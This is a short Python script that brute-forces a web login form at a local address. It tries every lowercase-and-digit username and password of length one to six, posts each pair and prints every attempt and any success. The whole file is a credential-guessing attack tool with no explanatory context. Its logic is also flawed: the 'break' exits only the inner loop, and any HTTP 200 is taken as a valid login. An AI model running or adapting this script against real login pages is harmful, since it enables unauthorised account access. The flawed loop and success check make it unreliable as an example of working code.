#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import itertools
import string

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    return response.status_code == 200

# Try different lengths for username and password
for username_length in range(1, 7):
    for password_length in range(1, 7):
        for username in itertools.product(string.ascii_lowercase + string.digits, repeat=username_length):
            for password in itertools.product(string.ascii_lowercase + string.digits, repeat=password_length):
                username_str = ''.join(username)
                password_str = ''.join(password)
                
                print(f"Trying Username: {username_str}, Password: {password_str}")
                
                if attempt_login(username_str, password_str):
                    print(f"Success! Username: {username_str}, Password: {password_str}")
                    break
